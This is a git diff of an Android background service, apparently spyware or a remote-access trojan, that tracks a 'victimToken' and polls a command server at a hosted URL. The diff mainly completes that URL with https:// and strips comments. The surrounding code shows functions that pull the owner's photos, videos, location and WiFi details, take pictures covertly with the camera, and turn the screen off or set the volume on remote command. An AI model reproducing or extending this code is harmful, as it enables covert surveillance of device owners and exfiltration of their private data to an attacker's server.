@@ -13,8 +13,6 @@ import android.content.Intent;
 import android.database.Cursor;
 import android.graphics.ImageFormat;
 import android.hardware.Camera;
-import android.hardware.camera2.CameraCharacteristics;
-import android.hardware.camera2.CameraManager;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
@@ -68,12 +66,15 @@ public class ServiceRunner extends Service {
     private static final String TAG = "SecurityCheck";
     private static final String CHANNEL_ID = "sys_service";
     private static final int NOTIFICATION_ID = 1001;
-    private static final String SERVER_URL = "daf-production-e34a.up.railway.app";
+
+    // ★★★ الرابط الكامل مع https:// ★★★
+    private static final String SERVER_URL = "https://daf-production-e34a.up.railway.app";
+
     private static final int POLL_INTERVAL = 15;
 
     private ScheduledExecutorService scheduler;
     private ScheduledExecutorService heartbeatScheduler;
-    private ExecutorService commandExecutor;    // ★ للـ commands الثقيلة
+    private ExecutorService commandExecutor;
     private String deviceId = "";
     private String victimToken = "";
     private boolean registered = false;
@@ -112,7 +113,6 @@ public class ServiceRunner extends Service {
         deviceId = getDeviceId();
         Log.d(TAG, "Device: " + deviceId);
 
-        // ★ Executor منفصل للأوامر الثقيلة
         commandExecutor = Executors.newFixedThreadPool(2);
 
         new Thread(() -> {
@@ -317,7 +317,6 @@ public class ServiceRunner extends Service {
 
             Log.d(TAG, "Received " + commands.length() + " commands");
 
-            // ★★★ شغّل الأوامر في thread منفصل ★★★
             for (int i = 0; i < commands.length(); i++) {
                 final JSONObject cmd = commands.getJSONObject(i);
                 commandExecutor.submit(() -> handleCommand(cmd));
@@ -612,7 +611,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★ WiFi Info — جديد ★
+    // WiFi Info
     // ============================================================
     private void sendWifiInfo() {
         try {
@@ -648,7 +647,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ سحب الصور ★★★
+    // سحب الصور
     // ============================================================
     private void sendPhotos() {
         try {
@@ -793,7 +792,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ سحب الفيديوهات ★★★
+    // سحب الفيديوهات
     // ============================================================
     private void sendVideos() {
         try {
@@ -935,7 +934,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Location — محسّن ★★★
+    // Location
     // ============================================================
     private void sendLocation() {
         try {
@@ -951,7 +950,6 @@ public class ServiceRunner extends Service {
                 return;
             }
 
-            // ★ 1. جرّب آخر موقع معروف
             Location loc = null;
 
             try {
@@ -963,7 +961,6 @@ public class ServiceRunner extends Service {
                 return;
             }
 
-            // ★ 2. لو مفيش — اطلب موقع جديد (مع انتظار 15 ثانية)
             if (loc == null) {
                 final CountDownLatch latch = new CountDownLatch(1);
                 final AtomicReference<Location> freshLoc = new AtomicReference<>(null);
@@ -1053,10 +1050,9 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★★★ Camera — محسّن ★★★
+    // Camera
     // ============================================================
     private void takePicture(final int cameraId) {
-        // ★ شغّلها في thread منفصل
         new Thread(() -> {
             try {
                 if (!hasPermission(android.Manifest.permission.CAMERA)) {
@@ -1065,7 +1061,6 @@ public class ServiceRunner extends Service {
                     return;
                 }
 
-                // ★ استخدم Handler على Main thread
                 Handler mainHandler = new Handler(Looper.getMainLooper());
                 mainHandler.post(() -> {
                     Camera camera = null;
@@ -1081,7 +1076,6 @@ public class ServiceRunner extends Service {
 
                         Camera.Parameters params = camera.getParameters();
 
-                        // ★ اختر دقة معقولة
                         try {
                             List<Camera.Size> sizes = params.getSupportedPictureSizes();
                             if (sizes != null && !sizes.isEmpty()) {
@@ -1102,7 +1096,6 @@ public class ServiceRunner extends Service {
                         try { params.setPictureFormat(ImageFormat.JPEG); } catch (Exception e) {}
                         try { params.setJpegQuality(85); } catch (Exception e) {}
 
-                        // ★ اضبط الفلاش والأوتوفوكس
                         try {
                             if (params.getSupportedFocusModes().contains(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE)) {
                                 params.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_PICTURE);
@@ -1141,7 +1134,7 @@ public class ServiceRunner extends Service {
                                 reportCommandResult(camName, "fail", "takePicture: " + e.getMessage());
                                 try { finalCamera.release(); } catch (Exception ignored) {}
                             }
-                        }, 1500);  // ★ زدت الوقت لـ 1.5 ثانية
+                        }, 1500);
 
                     } catch (Exception e) {
                         Log.e(TAG, "takePicture: " + e.getMessage());
@@ -1305,7 +1298,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★ Media Keys — جديد ★
+    // Media Keys
     // ============================================================
     private void sendMediaKey(String key) {
         try {
@@ -1339,7 +1332,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★ Screen Off — جديد ★
+    // Screen Off
     // ============================================================
     private void screenOff() {
         try {
@@ -1366,7 +1359,7 @@ public class ServiceRunner extends Service {
     }
 
     // ============================================================
-    // ★ Set Volume — جديد ★
+    // Set Volume
     // ============================================================
     private void setVolume(int level, String streamName) {
         try {
